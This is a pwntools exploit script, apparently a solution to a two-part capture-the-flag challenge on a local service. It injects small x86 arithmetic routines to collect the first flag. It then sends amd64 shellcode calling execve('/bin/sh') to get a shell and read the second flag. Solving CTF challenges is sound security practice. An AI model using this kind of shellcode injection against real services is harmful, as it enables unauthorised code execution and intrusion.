from pwn import *

# 过五关解决第一部分
r = remote("127.0.0.1", 64584)

add  = b"\x89\xf8\x01\xf0\xc3"
sub  = b"\x89\xf8\x29\xf0\xc3"
and_ = b"\x89\xf8\x21\xf0\xc3"
or_  = b"\x89\xf8\x09\xf0\xc3"
xor_ = b"\x89\xf8\x31\xf0\xc3"

for i, code in enumerate([add, sub, and_, or_, xor_], 1):
    r.recvuntil(f"Request-{i}".encode())
    r.send(code)

r.recvuntil(b"flag:\n")
flag1 = r.recvline().strip().decode()
log.success(f"FLAG1: {flag1}")
r.close()

#第5关 execve 拿 shell 解决第二部分
r = remote("127.0.0.1", 64584)

execve_sc = asm("""
    push rdi
    push rsi
    /* execve("/bin/sh", NULL, NULL) */
    xor rsi, rsi
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    xor eax, eax
    mov al, 59
    syscall
    /* 失败则恢复, 算 XOR 返回 */
    pop rax
    pop rax
    pop rsi
    pop rdi
    mov eax, edi
    xor eax, esi
    ret
""", arch='amd64')

for i, code in enumerate([add, sub, and_, or_, execve_sc], 1):
    r.recvuntil(f"Request-{i}".encode())
    r.send(code)

# 拿到 shell — 先吃掉之前的残留 prompt
r.recvuntil(b"XOR\n")
sleep(0.3)
r.sendline(b"cat flag2")
flag2 = r.recvline(timeout=3).strip().decode()
log.success(f"flag2: {flag2}")
r.close()

log.success(f"Full flag: {flag1}{flag2}")
